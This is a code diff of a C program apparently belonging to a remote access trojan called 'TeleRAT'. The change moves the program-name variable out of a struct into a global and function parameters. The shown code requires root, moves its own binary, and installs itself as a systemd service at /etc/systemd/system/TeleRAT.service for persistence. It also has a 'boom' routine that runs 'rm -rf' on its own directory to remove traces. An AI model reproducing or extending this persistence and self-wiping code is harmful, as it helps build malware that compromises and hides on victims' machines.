@@ -4,11 +4,10 @@
 #include<stdlib.h> //atoi
 struct cmdinfo{
     char nowPath[1024];
-    char pName[250];
     char cmd[10000];
     char moveTo[2048];
 };
-
+char progName[250];
 //Check is this program run as root or not
 void i_am_root(){
     if(getuid() != 0){
@@ -47,7 +46,7 @@ void exeCMD(char *cmd){
 
 
 //parse path to command
-void move(char *path){
+void move(char *path, char *pName){
     struct cmdinfo cmd;
     //Get now program location
     getNowPath(cmd.nowPath);
@@ -55,28 +54,28 @@ void move(char *path){
     printf("%s",cmd.nowPath);
 
 
-    getpName(cmd.pName);
+    getpName(pName);
     //parse path to cmd
-    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,cmd.pName,path,cmd.pName);
+    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
     // printf("%s",cmd.cmd);
     exeCMD(cmd.cmd);
 }
 
-void boom(char *path){
+void boom(char *path,char *pName){
     struct cmdinfo cmd;
     getNowPath(cmd.nowPath);
-    getpName(cmd.pName);
+    getpName(pName);
     sprintf(cmd.cmd,"rm -rf %s",cmd.nowPath);
     exeCMD(cmd.cmd);
 }
 
 
-void serviceSetting(){
+void serviceSetting(char *pName){
     struct cmdinfo cmd;   
     getNowPath(cmd.nowPath);
-    getpName(cmd.pName);
+    getpName(pName);
 	//Connect path with program	
-	sprintf(cmd.cmd,"%s%s",cmd.nowPath,cmd.pName);
+	sprintf(cmd.cmd,"%s%s",cmd.nowPath,pName);
 	
 	//writing in /etc/systemd/system
 	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","w");
@@ -96,10 +95,11 @@ void serviceSetting(){
 	fprintf(f,"%s",cmd.cmd);
 }
 
-int main(int argc , char *argv[]){
 
+
+int main(int argc , char *argv[]){
     struct cmdinfo cmd;
-    strcpy(cmd.pName,argv[0]);
+
     // strcpy(cmd.moveTo,argv[1]);
 
 
